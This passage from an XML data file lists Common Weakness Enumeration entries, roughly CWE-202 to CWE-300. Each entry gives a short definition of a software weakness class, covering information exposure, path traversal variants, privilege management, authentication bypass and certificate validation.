  <description>When trying to keep information confidential, an attacker can often infer some of the information by using statistics.In situations where data should not be tied to individual users, but a large number of users should be able to make queries that &quot;scrub&quot; the identity of users, it may be possible to get information about a user -- e.g., by specifying search terms that are known to be unique to that user.</description>
</vulnerability>
<vulnerability label="CWE-203" name="Information Exposure Through Discrepancy" type="Class" reference="CWE">
  <description>The product behaves differently or sends different responses in a way that exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not.</description>
</vulnerability>
<vulnerability label="CWE-204" name="Response Discrepancy Information Exposure" type="Base" reference="CWE">
  <description>The software provides different responses to incoming requests in a way that allows an actor to determine system state information that is outside of that actor's control sphere.This issue frequently occurs during authentication, where a difference in failed-login messages could allow an attacker to determine if the username is valid or not. These exposures can be inadvertent (bug) or intentional (design).</description>
</vulnerability>
<vulnerability label="CWE-205" name="Information Exposure Through Behavioral Discrepancy" type="Base" reference="CWE">
  <description>The product's actions indicate important differences based on (1) the internal state of the product or (2) differences from other products in the same class.For example, attacks such as OS fingerprinting rely heavily on both behavioral and response discrepancies.</description>
</vulnerability>
<vulnerability label="CWE-206" name="Information Exposure of Internal State Through Behavioral Inconsistency" type="Variant" reference="CWE">
  <description>Two separate operations in a product cause the product to behave differently in a way that is observable to an attacker and reveals security-relevant information about the internal state of the product, such as whether a particular operation was successful or not.</description>
</vulnerability>
<vulnerability label="CWE-207" name="Information Exposure Through an External Behavioral Inconsistency" type="Variant" reference="CWE">
  <description>The product behaves differently than other products like it, in a way that is observable to an attacker and exposes security-relevant information about which product is being used.</description>
</vulnerability>
<vulnerability label="CWE-208" name="Information Exposure Through Timing Discrepancy" type="Base" reference="CWE">
  <description>Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.</description>
</vulnerability>
<vulnerability label="CWE-209" name="Information Exposure Through an Error Message" type="Base" reference="CWE">
  <description>The software generates an error message that includes sensitive information about its environment, users, or associated data.The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more deadly attacks. If an attack fails, an attacker may use error information provided by the server to launch another more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of &quot;..&quot; sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.</description>
</vulnerability>
<vulnerability label="CWE-210" name="Information Exposure Through Generated Error Message" type="Base" reference="CWE">
  <description>The software identifies an error condition and creates its own diagnostic or error messages that contain sensitive information.</description>
</vulnerability>
<vulnerability label="CWE-211" name="Information Exposure Through External Error Message" type="Base" reference="CWE">
  <description>The software performs an operation that triggers an external diagnostic or error message that is not directly generated by the software, such as an error generated by the programming language interpreter that the software uses. The error can contain sensitive system information.</description>
</vulnerability>
<vulnerability label="CWE-212" name="Improper Cross-boundary Removal of Sensitive Data" type="Base" reference="CWE">
  <description>The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere.Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing. For example, software that is used for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.</description>
</vulnerability>
<vulnerability label="CWE-213" name="Intentional Information Exposure" type="Base" reference="CWE">
  <description>A product's design or configuration explicitly requires the publication of information that could be regarded as sensitive by an administrator.</description>
</vulnerability>
<vulnerability label="CWE-214" name="Information Exposure Through Process Environment" type="Variant" reference="CWE">
  <description>A process is invoked with sensitive arguments, environment variables, or other elements that can be seen by other processes on the operating system.Many operating systems allow a user to list information about processes that are owned by other users. This information could include command line arguments or environment variable settings. When this data contains sensitive information such as credentials, it might allow other users to launch an attack against the software or related resources.</description>
</vulnerability>
<vulnerability label="CWE-215" name="Information Exposure Through Debug Information" type="Variant" reference="CWE">
  <description>The application contains debugging code that can expose sensitive information to untrusted parties.</description>
</vulnerability>
<vulnerability label="CWE-216" name="Containment Errors (Container Errors)" type="Class" reference="CWE">
  <description>This tries to cover various problems in which improper data are included within a &quot;container.&quot;</description>
</vulnerability>
<vulnerability label="CWE-217" name="DEPRECATED: Failure to Protect Stored Data from Modification" type="Base" reference="CWE">
  <description>This weakness has been deprecated because it incorporated and confused multiple weaknesses. The issues formerly covered in this weakness can be found at CWE-766 and CWE-767.</description>
</vulnerability>
<vulnerability label="CWE-218" name="DEPRECATED (Duplicate): Failure to provide confidentiality for stored data" type="Base" reference="CWE">
  <description>This weakness has been deprecated because it was a duplicate of CWE-493. All content has been transferred to CWE-493.</description>
</vulnerability>
<vulnerability label="CWE-219" name="Sensitive Data Under Web Root" type="Variant" reference="CWE">
  <description>The application stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties.</description>
</vulnerability>
<vulnerability label="CWE-22" name="Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" type="Class" reference="CWE">
  <description>The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.Many file operations are intended to take place within a restricted directory. By using special elements such as &quot;..&quot; and &quot;/&quot; separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the &quot;../&quot; sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as &quot;/usr/local/bin&quot;, which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the software may add &quot;.txt&quot; to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.</description>
</vulnerability>
<vulnerability label="CWE-220" name="Sensitive Data Under FTP Root" type="Variant" reference="CWE">
  <description>The application stores sensitive data under the FTP document root with insufficient access control, which might make it accessible to untrusted parties.</description>
</vulnerability>
<vulnerability label="CWE-221" name="Information Loss or Omission" type="Class" reference="CWE">
  <description>The software does not record, or improperly records, security-relevant information that leads to an incorrect decision or hampers later analysis.This can be resultant, e.g. a buffer overflow might trigger a crash before the product can log the event.</description>
</vulnerability>
<vulnerability label="CWE-222" name="Truncation of Security-relevant Information" type="Base" reference="CWE">
  <description>The application truncates the display, recording, or processing of security-relevant information in a way that can obscure the source or nature of an attack.</description>
</vulnerability>
<vulnerability label="CWE-223" name="Omission of Security-relevant Information" type="Base" reference="CWE">
  <description>The application does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.</description>
</vulnerability>
<vulnerability label="CWE-224" name="Obscured Security-relevant Information by Alternate Name" type="Base" reference="CWE">
  <description>The software records security-relevant information according to an alternate name of the affected entity, instead of the canonical name.</description>
</vulnerability>
<vulnerability label="CWE-225" name="DEPRECATED (Duplicate): General Information Management Problems" type="Base" reference="CWE">
  <description>This weakness can be found at CWE-199.</description>
</vulnerability>
<vulnerability label="CWE-226" name="Sensitive Information Uncleared Before Release" type="Base" reference="CWE">
  <description>The software does not fully clear previously used information in a data structure, file, or other resource, before making that resource available to a party in another control sphere.This typically results from new data that is not as long as the old data, which leaves portions of the old data still available. Equivalent errors can occur in other situations where the length of data is variable but the associated data structure is not. If memory is not cleared after use, it may allow unintended actors to read the data when the memory is reallocated.</description>
</vulnerability>
<vulnerability label="CWE-227" name="Improper Fulfillment of API Contract ('API Abuse')" type="Class" reference="CWE">
  <description>The software uses an API in a manner contrary to its intended use.An API is a contract between a caller and a callee. The most common forms of API misuse occurs when the caller does not honor its end of this contract. For example, if a program does not call chdir() after calling chroot(), it violates the contract that specifies how to change the active root directory in a secure fashion. Another good example of library abuse is expecting the callee to return trustworthy DNS information to the caller. In this case, the caller misuses the callee API by making certain assumptions about its behavior (that the return value can be used for authentication purposes). One can also violate the caller-callee contract from the other side. For example, if a coder subclasses SecureRandom and returns a non-random value, the contract is violated.</description>
</vulnerability>
<vulnerability label="CWE-228" name="Improper Handling of Syntactically Invalid Structure" type="Class" reference="CWE">
  <description>The product does not handle or incorrectly handles input that is not syntactically well-formed with respect to the associated specification.</description>
</vulnerability>
<vulnerability label="CWE-229" name="Improper Handling of Values" type="Class" reference="CWE">
  <description>Weaknesses in this category are related to missing or incorrect handling of values that are associated with parameters, fields, or arguments.</description>
</vulnerability>
<vulnerability label="CWE-23" name="Relative Path Traversal" type="Base" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as &quot;..&quot; that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.</description>
</vulnerability>
<vulnerability label="CWE-230" name="Improper Handling of Missing Values" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a parameter, field, or argument name is specified, but the associated value is missing, i.e. it is empty, blank, or null.</description>
</vulnerability>
<vulnerability label="CWE-231" name="Improper Handling of Extra Values" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when more values are specified than expected.</description>
</vulnerability>
<vulnerability label="CWE-232" name="Improper Handling of Undefined Values" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a value is not defined or supported for the associated parameter, field, or argument name.</description>
</vulnerability>
<vulnerability label="CWE-233" name="Parameter Problems" type="Class" reference="CWE">
  <description>Weaknesses in this category are related to improper handling of parameters, fields, or arguments.</description>
</vulnerability>
<vulnerability label="CWE-234" name="Failure to Handle Missing Parameter" type="Base" reference="CWE">
  <description>If too few arguments are sent to a function, the function will still pop the expected number of arguments from the stack. Potentially, a variable number of arguments could be exhausted in a function as well.</description>
</vulnerability>
<vulnerability label="CWE-235" name="Improper Handling of Extra Parameters" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a particular parameter, field, or argument name is specified two or more times.</description>
</vulnerability>
<vulnerability label="CWE-236" name="Improper Handling of Undefined Parameters" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a particular parameter, field, or argument name is not defined or supported by the product.</description>
</vulnerability>
<vulnerability label="CWE-237" name="Improper Handling of Structural Elements" type="Class" reference="CWE">
  <description>The software does not handle or incorrectly handles inputs that are related to complex structures.</description>
</vulnerability>
<vulnerability label="CWE-238" name="Improper Handling of Incomplete Structural Elements" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a particular structural element is not completely specified.</description>
</vulnerability>
<vulnerability label="CWE-239" name="Failure to Handle Incomplete Element" type="Base" reference="CWE">
  <description>The software does not properly handle when a particular element is not completely specified.</description>
</vulnerability>
<vulnerability label="CWE-24" name="Path Traversal: '../filedir'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize &quot;../&quot; sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The &quot;../&quot; manipulation is the canonical manipulation for operating systems that use &quot;/&quot; as directory separators, such as UNIX- and Linux-based systems. In some cases, it is useful for bypassing protection schemes in environments for which &quot;/&quot; is supported but not the primary separator, such as Windows, which uses &quot;\&quot; but can also accept &quot;/&quot;.</description>
</vulnerability>
<vulnerability label="CWE-240" name="Improper Handling of Inconsistent Structural Elements" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when two or more structural elements should be consistent, but are not.</description>
</vulnerability>
<vulnerability label="CWE-241" name="Improper Handling of Unexpected Data Type" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when a particular element is not the expected type, e.g. it expects a digit (0-9) but is provided with a letter (A-Z).</description>
</vulnerability>
<vulnerability label="CWE-242" name="Use of Inherently Dangerous Function" type="Base" reference="CWE">
  <description>The program calls a function that can never be guaranteed to work safely.Certain functions behave in dangerous ways regardless of how they are used. Functions in this category were often implemented without taking security concerns into account. The gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer. Similarly, the &gt;&gt; operator is unsafe to use when reading into a statically-allocated character array because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to the &gt;&gt; operator and overflow the destination buffer.</description>
</vulnerability>
<vulnerability label="CWE-243" name="Creation of chroot Jail Without Changing Working Directory" type="Variant" reference="CWE">
  <description>The program uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called.</description>
</vulnerability>
<vulnerability label="CWE-244" name="Improper Clearing of Heap Memory Before Release ('Heap Inspection')" type="Variant" reference="CWE">
  <description>Using realloc() to resize buffers that store sensitive information can leave the sensitive information exposed to attack, because it is not removed from memory.When sensitive data such as a password or an encryption key is not removed from memory, it could be exposed to an attacker using a &quot;heap inspection&quot; attack that reads the sensitive data using memory dumps or other methods. The realloc() function is commonly used to increase the size of a block of allocated memory. This operation often requires copying the contents of the old memory block into a new and larger block. This operation leaves the contents of the original block intact but inaccessible to the program, preventing the program from being able to scrub sensitive data from memory. If an attacker can later examine the contents of a memory dump, the sensitive data could be exposed.</description>
</vulnerability>
<vulnerability label="CWE-245" name="J2EE Bad Practices: Direct Management of Connections" type="Variant" reference="CWE">
  <description>The J2EE application directly manages connections, instead of using the container's connection management facilities.</description>
</vulnerability>
<vulnerability label="CWE-246" name="J2EE Bad Practices: Direct Use of Sockets" type="Variant" reference="CWE">
  <description>The J2EE application directly uses sockets instead of using framework method calls.</description>
</vulnerability>
<vulnerability label="CWE-247" name="Reliance on DNS Lookups in a Security Decision" type="Variant" reference="CWE">
  <description>Attackers can spoof DNS entries. Do not rely on DNS names for security.</description>
</vulnerability>
<vulnerability label="CWE-248" name="Uncaught Exception" type="Base" reference="CWE">
  <description>An exception is thrown from a function, but it is not caught.When an exception is not caught, it may cause the program to crash or expose sensitive information.</description>
</vulnerability>
<vulnerability label="CWE-249" name="DEPRECATED: Often Misused: Path Manipulation" type="Variant" reference="CWE">
  <description>This entry has been deprecated because of name confusion and an accidental combination of multiple weaknesses. Most of its content has been transferred to CWE-785.</description>
</vulnerability>
<vulnerability label="CWE-25" name="Path Traversal: '/../filedir'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize &quot;/../&quot; sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.Sometimes a program checks for &quot;../&quot; at the beginning of the input, so a &quot;/../&quot; can bypass that check.</description>
</vulnerability>
<vulnerability label="CWE-250" name="Execution with Unnecessary Privileges" type="Class" reference="CWE">
  <description>The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges.</description>
</vulnerability>
<vulnerability label="CWE-252" name="Unchecked Return Value" type="Base" reference="CWE">
  <description>The software does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.Two common programmer assumptions are &quot;this function call can never fail&quot; and &quot;it doesn't matter if this function call fails&quot;. If an attacker can force the function to fail or otherwise return a value that is not expected, then the subsequent program logic could lead to a vulnerability, because the software is not in a state that the programmer assumes. For example, if the program calls a function to drop privileges but does not check the return code to ensure that privileges were successfully dropped, then the program will continue to operate with the higher privileges.</description>
</vulnerability>
<vulnerability label="CWE-253" name="Incorrect Check of Function Return Value" type="Base" reference="CWE">
  <description>The software incorrectly checks a return value from a function, which prevents the software from detecting errors or exceptional conditions.</description>
</vulnerability>
<vulnerability label="CWE-256" name="Plaintext Storage of a Password" type="Variant" reference="CWE">
  <description>Storing a password in plaintext may result in a system compromise.</description>
</vulnerability>
<vulnerability label="CWE-257" name="Storing Passwords in a Recoverable Format" type="Base" reference="CWE">
  <description>The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.</description>
</vulnerability>
<vulnerability label="CWE-258" name="Empty Password in Configuration File" type="Variant" reference="CWE">
  <description>Using an empty string as a password is insecure.</description>
</vulnerability>
<vulnerability label="CWE-259" name="Use of Hard-coded Password" type="Base" reference="CWE">
  <description>The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.A hard-coded password typically leads to a significant authentication failure that can be difficult for the system administrator to detect. Once detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:Inbound: the software contains an authentication mechanism that checks for a hard-coded password.Outbound: the software connects to another system or component, and it contains hard-coded password for connecting to that component.In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</description>
</vulnerability>
<vulnerability label="CWE-26" name="Path Traversal: '/dir/../filename'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize &quot;/dir/../filename&quot; sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '/dir/../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for &quot;../&quot; at the beginning of the input, so a &quot;/../&quot; can bypass that check.</description>
</vulnerability>
<vulnerability label="CWE-260" name="Password in Configuration File" type="Variant" reference="CWE">
  <description>The software stores a password in a configuration file that might be accessible to actors who do not know the password.This can result in compromise of the system for which the password is used. An attacker could gain access to this file and learn the stored password or worse yet, change the password to one of their choosing.</description>
</vulnerability>
<vulnerability label="CWE-261" name="Weak Cryptography for Passwords" type="Variant" reference="CWE">
  <description>Obscuring a password with a trivial encoding does not protect the password.</description>
</vulnerability>
<vulnerability label="CWE-262" name="Not Using Password Aging" type="Variant" reference="CWE">
  <description>If no mechanism is in place for managing password aging, users will have no incentive to update passwords in a timely manner.</description>
</vulnerability>
<vulnerability label="CWE-263" name="Password Aging with Long Expiration" type="Base" reference="CWE">
  <description>Allowing password aging to occur unchecked can result in the possibility of diminished password integrity.Just as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password.</description>
</vulnerability>
<vulnerability label="CWE-266" name="Incorrect Privilege Assignment" type="Base" reference="CWE">
  <description>A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.</description>
</vulnerability>
<vulnerability label="CWE-267" name="Privilege Defined With Unsafe Actions" type="Base" reference="CWE">
  <description>A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity.</description>
</vulnerability>
<vulnerability label="CWE-268" name="Privilege Chaining" type="Base" reference="CWE">
  <description>Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.</description>
</vulnerability>
<vulnerability label="CWE-269" name="Improper Privilege Management" type="Base" reference="CWE">
  <description>The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.</description>
</vulnerability>
<vulnerability label="CWE-27" name="Path Traversal: 'dir/../../filename'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize multiple internal &quot;../&quot; sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The 'directory/../../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one &quot;../&quot; sequence, so multiple &quot;../&quot; can bypass that check. Alternately, this manipulation could be used to bypass a check for &quot;../&quot; at the beginning of the pathname, moving up more than one directory level.</description>
</vulnerability>
<vulnerability label="CWE-270" name="Privilege Context Switching Error" type="Base" reference="CWE">
  <description>The software does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control.</description>
</vulnerability>
<vulnerability label="CWE-271" name="Privilege Dropping / Lowering Errors" type="Class" reference="CWE">
  <description>The software does not drop privileges before passing control of a resource to an actor that does not have those privileges.In some contexts, a system executing with elevated permissions will hand off a process/file/etc. to another process or user. If the privileges of an entity are not reduced, then elevated privileges are spread throughout a system and possibly to an attacker.</description>
</vulnerability>
<vulnerability label="CWE-272" name="Least Privilege Violation" type="Base" reference="CWE">
  <description>The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed.</description>
</vulnerability>
<vulnerability label="CWE-273" name="Improper Check for Dropped Privileges" type="Base" reference="CWE">
  <description>The software attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded.If the drop fails, the software will continue to run with the raised privileges, which might provide additional access to unprivileged users.</description>
</vulnerability>
<vulnerability label="CWE-274" name="Improper Handling of Insufficient Privileges" type="Base" reference="CWE">
  <description>The software does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses.</description>
</vulnerability>
<vulnerability label="CWE-276" name="Incorrect Default Permissions" type="Variant" reference="CWE">
  <description>The software, upon installation, sets incorrect permissions for an object that exposes it to an unintended actor.</description>
</vulnerability>
<vulnerability label="CWE-277" name="Insecure Inherited Permissions" type="Variant" reference="CWE">
  <description>A product defines a set of insecure permissions that are inherited by objects that are created by the program.</description>
</vulnerability>
<vulnerability label="CWE-278" name="Insecure Preserved Inherited Permissions" type="Variant" reference="CWE">
  <description>A product inherits a set of insecure permissions for an object, e.g. when copying from an archive file, without user awareness or involvement.</description>
</vulnerability>
<vulnerability label="CWE-279" name="Incorrect Execution-Assigned Permissions" type="Variant" reference="CWE">
  <description>While it is executing, the software sets the permissions of an object in a way that violates the intended permissions that have been specified by the user.</description>
</vulnerability>
<vulnerability label="CWE-28" name="Path Traversal: '..\filedir'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize &quot;..\&quot; sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '..\' manipulation is the canonical manipulation for operating systems that use &quot;\&quot; as directory separators, such as Windows. However, it is also useful for bypassing path traversal protection schemes that only assume that the &quot;/&quot; separator is valid.</description>
</vulnerability>
<vulnerability label="CWE-280" name="Improper Handling of Insufficient Permissions or Privileges " type="Base" reference="CWE">
  <description>The application does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the application in an invalid state.</description>
</vulnerability>
<vulnerability label="CWE-281" name="Improper Preservation of Permissions" type="Base" reference="CWE">
  <description>The software does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended.</description>
</vulnerability>
<vulnerability label="CWE-282" name="Improper Ownership Management" type="Class" reference="CWE">
  <description>The software assigns the wrong ownership, or does not properly verify the ownership, of an object or resource.</description>
</vulnerability>
<vulnerability label="CWE-283" name="Unverified Ownership" type="Base" reference="CWE">
  <description>The software does not properly verify that a critical resource is owned by the proper entity.</description>
</vulnerability>
<vulnerability label="CWE-284" name="Improper Access Control" type="Class" reference="CWE">
  <description>The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor.Access control involves the use of several protection mechanisms such as authentication (proving the identity of an actor) authorization (ensuring that a given actor can access a resource), and accountability (tracking of activities that were performed). When any mechanism is not applied or otherwise fails, attackers can compromise the security of the software by gaining privileges, reading sensitive information, executing commands, evading detection, etc.There are two distinct behaviors that can introduce access control weaknesses:Specification: incorrect privileges, permissions, ownership, etc. are explicitly specified for either the user or the resource (for example, setting a password file to be world-writable, or giving administrator capabilities to a guest user). This action could be performed by the program or the administrator.Enforcement: the mechanism contains errors that prevent it from properly enforcing the specified access control requirements (e.g., allowing the user to specify their own privileges, or allowing a syntactically-incorrect ACL to produce insecure settings). This problem occurs within the program itself, in that it does not actually enforce the intended security policy that the administrator specifies.</description>
</vulnerability>
<vulnerability label="CWE-285" name="Improper Authorization" type="Class" reference="CWE">
  <description>The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</description>
</vulnerability>
<vulnerability label="CWE-286" name="Incorrect User Management" type="Class" reference="CWE">
  <description>The software does not properly manage a user within its environment.Users can be assigned to the wrong group (class) of permissions resulting in unintended access rights to sensitive objects.</description>
</vulnerability>
<vulnerability label="CWE-287" name="Improper Authentication" type="Class" reference="CWE">
  <description>When an actor claims to have a given identity, the software does not prove or insufficiently proves that the claim is correct.</description>
</vulnerability>
<vulnerability label="CWE-288" name="Authentication Bypass Using an Alternate Path or Channel" type="Base" reference="CWE">
  <description>A product requires authentication, but the product has an alternate path or channel that does not require authentication.</description>
</vulnerability>
<vulnerability label="CWE-289" name="Authentication Bypass by Alternate Name" type="Variant" reference="CWE">
  <description>The software performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor.</description>
</vulnerability>
<vulnerability label="CWE-29" name="Path Traversal: '\..\filename'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.This is similar to CWE-25, except using &quot;\&quot; instead of &quot;/&quot;. Sometimes a program checks for &quot;..\&quot; at the beginning of the input, so a &quot;\..\&quot; can bypass that check. It is also useful for bypassing path traversal protection schemes that only assume that the &quot;/&quot; separator is valid.</description>
</vulnerability>
<vulnerability label="CWE-290" name="Authentication Bypass by Spoofing" type="Base" reference="CWE">
  <description>This attack-focused weakness is caused by improperly implemented authentication schemes that are subject to spoofing attacks.</description>
</vulnerability>
<vulnerability label="CWE-292" name="Trusting Self-reported DNS Name" type="Variant" reference="CWE">
  <description>The use of self-reported DNS names as authentication is flawed and can easily be spoofed by malicious users.</description>
</vulnerability>
<vulnerability label="CWE-293" name="Using Referer Field for Authentication" type="Variant" reference="CWE">
  <description>The referer field in HTTP requests can be easily modified and, as such, is not a valid means of message integrity checking.</description>
</vulnerability>
<vulnerability label="CWE-294" name="Authentication Bypass by Capture-replay" type="Base" reference="CWE">
  <description>A capture-replay flaw exists when the design of the software makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.</description>
</vulnerability>
<vulnerability label="CWE-296" name="Improper Following of Chain of Trust for Certificate Validation" type="Base" reference="CWE">
  <description>The chain of trust is not followed or is incorrectly followed when validating a certificate, resulting in incorrect trust of any resource that is associated with that certificate.</description>
</vulnerability>
<vulnerability label="CWE-297" name="Improper Validation of Host-specific Certificate Data" type="Base" reference="CWE">
  <description>Host-specific certificate data is not validated or is incorrectly validated, so while the certificate read is valid, it may not be for the site originally requested.If the host-specific data contained in a certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid and that it pertains to the site that we wish to access.</description>
</vulnerability>
<vulnerability label="CWE-298" name="Improper Validation of Certificate Expiration" type="Base" reference="CWE">
  <description>A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age.When the expiration of a certificate is not taken into account no trust has necessarily been conveyed through it. Therefore, the validity of the certificate cannot be verified and all benefit of the certificate is lost.</description>
</vulnerability>
<vulnerability label="CWE-299" name="Improper Check for Certificate Revocation" type="Base" reference="CWE">
  <description>The software does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised.</description>
</vulnerability>
<vulnerability label="CWE-30" name="Path Traversal: '\dir\..\filename'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\dir\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.This is similar to CWE-26, except using &quot;\&quot; instead of &quot;/&quot;. The '\dir\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for &quot;..\&quot; at the beginning of the input, so a &quot;\..\&quot; can bypass that check.</description>
</vulnerability>
<vulnerability label="CWE-300" name="Channel Accessible by Non-Endpoint ('Man-in-the-Middle')" type="Class" reference="CWE">
  <description>The product does not adequately verify the identity of actors at both ends of a communication channel, or does not adequately ensure the integrity of the channel, in a way that allows the channel to be accessed or influenced by an actor that is not an endpoint.In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities.</description>
